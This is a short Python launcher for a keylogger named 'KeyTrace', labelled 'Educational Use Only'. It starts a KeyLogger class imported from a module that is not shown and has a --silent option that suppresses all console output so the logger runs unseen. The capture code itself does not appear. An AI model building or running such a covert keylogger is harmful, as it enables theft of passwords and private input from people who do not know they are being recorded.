import argparse
import sys
from core.logger import KeyLogger
from config import config

def start_keylogger():
    logger = KeyLogger()
    logger.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="KeyTrace Keylogger (Educational Use Only)")
    parser.add_argument("--silent", action="store_true", help="Run without console output")
    args = parser.parse_args()

    if args.silent:
        config.SILENT_MODE = True
        sys.stdout = open(sys.devnull, "w")  # Suppress output

    print("[*] Starting KeyTrace keylogger (educational mode)...")
    start_keylogger()
